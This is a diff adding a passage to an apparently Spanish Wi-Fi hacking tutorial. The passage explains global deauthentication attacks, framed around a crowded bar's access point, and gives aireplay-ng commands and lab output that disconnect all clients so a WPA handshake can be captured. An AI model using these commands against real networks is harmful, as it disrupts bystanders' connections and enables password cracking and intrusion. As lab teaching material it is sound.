@@ -632,7 +632,7 @@ número infinito/ilimitado de paquetes de deautenticación a la estación objeti
 
 Esto mismo lo podríamos haber hecho especificando la dirección MAC del AP en vez de su **ESSID**:
 
-* aireplay-ng -0 0 -a  -c 34:41:5D:46:D1:38 wlan0mon
+* aireplay-ng -0 0 -a 20:34:FB:B1:C5:53 -c 34:41:5D:46:D1:38 wlan0mon
 
 Obteniendo los siguientes resultados:
 
@@ -704,6 +704,77 @@ hará será reconectarse al AP, sin nosotros tener que hacer nada. Y es en este 
  Jugaremos con el Handshake más adelante, veamos primero otras formas de obtener el Handshake.
 
  #### Ataque de deautenticación global
+
+ Imaginemos ahora que estamos en un bar, un bar lleno de gente con un punto de acceso del propio
+ establecimiento. En estos casos, cuando una red dispone de tantos clientes asociados, es más factible lanzar
+ otro tipo de ataque, el **ataque de deautenticación global**.
+
+ A diferencia del ataque de deautenticación dirigido, en el ataque de deautenticación global, se hace uso de
+ una **Broadcast MAC Address** como dirección MAC de estación objetivo a utilizar. Lo que conseguimos con esta
+ dirección MAC, es expulsar a todos los clientes que se encuentren asociados el AP.
+
+ Esto es mejor incluso, dado que siempre es probable que en una muestra de 20 clientes, 5 de ellos a lo mejor
+ no se encuentren lo suficientemente cerca del router para elaborar el ataque (recordemos que esto se puede
+ ver tanto desde el **PWR** como a nivel de **Frames** emitidos por la estación.) En vez de estar por tanto
+ deautenticando de cliente en cliente hasta dar con aquel que se encuentre a una distancia considerable como
+ paraque capturemos un Handshake, resulta más cómodo expulsarlos a todos.
+
+ Basta con que uno de todos esos clientes se reconecte, para capturar un Handshake válido. Hay que tener en
+ cuenta que es posible capturar múltiples Handshakes por parte de distintas estaciones en un mismo AP, pero
+ esto no supone ningún problema.
+
+ El ataque se puede elaborar de 2 formas, una es la siguiente:
+
+ * aireplay-ng -0 0 -e hacklab -c FF:FF:FF:FF:FF:FF wlan0mon
+
+Obteniendo los siguientes resultados:
+
+ ```bash
+┌─[root@parrot]─[/home/s4vitar]
+└──╼ #aireplay-ng -0 10 -e hacklab -c FF:FF:FF:FF:FF:FF wlan0mon
+21:10:33  Waiting for beacon frame (ESSID: hacklab) on channel 12
+Found BSSID "20:34:FB:B1:C5:53" to given ESSID "hacklab".
+21:10:33  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
+21:10:34  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
+21:10:34  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
+21:10:35  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 1| 0 ACKs]
+21:10:36  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
+21:10:36  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
+21:10:36  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
+21:10:37  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 1| 0 ACKs]
+21:10:37  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
+21:10:38  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 2| 0 ACKs]
+ ```
+
+Y la otra sin especificar ninguna dirección MAC, lo que por defecto la suite interpretará como un ataque de
+deautenticación global:
+
+* aireplay-ng -0 0 -e hacklab wlan0mon
+
+Obteniendo estos resultados:
+
+```bash
+┌─[root@parrot]─[/home/s4vitar]
+└──╼ #aireplay-ng -0 10 -e hacklab wlan0mon
+21:11:46  Waiting for beacon frame (ESSID: hacklab) on channel 12
+Found BSSID "20:34:FB:B1:C5:53" to given ESSID "hacklab".
+NB: this attack is more effective when targeting
+a connected wireless client (-c <client's mac>).
+21:11:46  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
+21:11:47  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
+21:11:47  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
+21:11:48  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
+21:11:48  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
+21:11:49  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
+21:11:49  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
+21:11:50  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
+21:11:50  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
+21:11:51  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
+```
+
+#### Ataque de autenticación
+
+
 
 
 
